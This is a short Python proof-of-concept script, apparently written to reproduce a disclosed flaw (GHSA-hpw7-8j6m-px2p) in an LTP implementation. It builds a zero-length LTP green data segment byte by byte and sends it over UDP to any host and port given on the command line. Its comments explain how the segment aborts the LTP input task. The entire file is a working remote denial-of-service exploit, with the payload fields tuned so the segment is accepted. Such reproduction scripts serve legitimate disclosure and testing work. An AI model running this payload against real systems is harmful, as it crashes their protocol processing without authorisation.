#!/usr/bin/env python3
#
# send_green_segment.py HOST PORT
#
# Send one crafted LTP green data segment with a declared data length of zero to
# the udplsi UDP port, reproducing GHSA-hpw7-8j6m-px2p: handleGreenDataSegment()
# passes the wire-supplied length to sdr_insert(), whose allocator rejects a zero
# size with an assertion that aborts the LTP input task.
#
# LTP data-segment wire format (RFC 5326), all multi-byte fields SDNV:
#   control byte = (version << 4) | segment type code   (version 0, green = 0x04)
#   session originator (engine ID) SDNV
#   session number SDNV
#   extension counts byte = (header count << 4) | trailer count
#   client service ID SDNV
#   offset SDNV
#   length SDNV
#   ... data ...
#
# Engine ID 1 matches the loopback span; client service ID 1 is BpLtpClientId,
# which ltpcli registers; length 0 is the malicious field.

import socket
import sys


def main():
    if len(sys.argv) != 3:
        sys.stderr.write("usage: send_green_segment.py HOST PORT\n")
        return 1

    host = sys.argv[1]
    port = int(sys.argv[2])

    segment = bytes([
        0x04,               # control: version 0, type LtpDsGreen (EXC flag)
        0x01,               # session originator engine ID = 1 (matches span)
        0xBD, 0x84, 0x40,   # session number = 1000000 (SDNV); high, so it
                            #   does not collide with a closed session created
                            #   by ordinary loopback traffic
        0x00,               # extension counts: no header/trailer extensions
        0x01,               # client service ID = 1 (BpLtpClientId, ltpcli)
        0x00,               # offset = 0
        0x00,               # length = 0   <-- zero-length green segment
    ])

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sock.sendto(segment, (host, port))
    finally:
        sock.close()

    sys.stderr.write("sent %d-byte zero-length green LTP segment to %s:%d\n"
                     % (len(segment), host, port))
    return 0


if __name__ == "__main__":
    sys.exit(main())
